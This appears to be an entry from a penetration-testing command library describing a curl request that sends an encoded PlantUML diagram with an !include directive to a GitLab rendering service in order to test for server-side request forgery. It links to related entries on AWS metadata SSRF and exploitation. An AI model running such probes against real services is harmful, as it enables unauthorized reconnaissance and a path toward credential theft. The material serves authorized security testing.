---
id: cmd-plantuml-basic-include
data: >-
  curl
  "https://plantuml.pre.gitlab.com/uml/Aov9B2hXKW02AvTyXUByt5I5ufBIj3Hhi9XYPbvoJcbAga96IKc1bRw-eP6vdW4G6bfP65WOS1MNv1TO0m00"
tags:
  - ssrf
  - recon
type: command
output: Rendered SVG diagram with included remote content
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.486Z'
verified: false
validated: true
submitted: true
---
# plantuml-submit-basic-include

## Command

```bash
curl "https://plantuml.pre.gitlab.com/uml/Aov9B2hXKW02AvTyXUByt5I5ufBIj3Hhi9XYPbvoJcbAga96IKc1bRw-eP6vdW4G6bfP65WOS1MNv1TO0m00"
```

## Description

Submits an encoded PlantUML diagram to the GitLab rendering service using the !include directive to fetch and incorporate content from a public remote URL, testing for SSRF capability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Encoded PlantUML submission endpoint | Yes |

## Examples

### Basic Usage

```bash
curl "https://plantuml.pre.gitlab.com/uml/Aov9B2hXKW02AvTyXUByt5I5ufBIj3Hhi9XYPbvoJcbAga96IKc1bRw-eP6vdW4G6bfP65WOS1MNv1TO0m00"
```

### Advanced Usage

```bash
curl -s "https://plantuml.pre.gitlab.com/uml/[ENCODED_DIAGRAM]" | grep -o 'included content'
```

## Expected Output

HTTP response with SVG content rendering a UML diagram that embeds the fetched remote resource, such as text or elements from the included URL.

## Related

- [[commands/plantuml-ssrf-aws-metadata]]
- [[procedures/Exploit-SSRF-via-PlantUML-Include-Directive]]
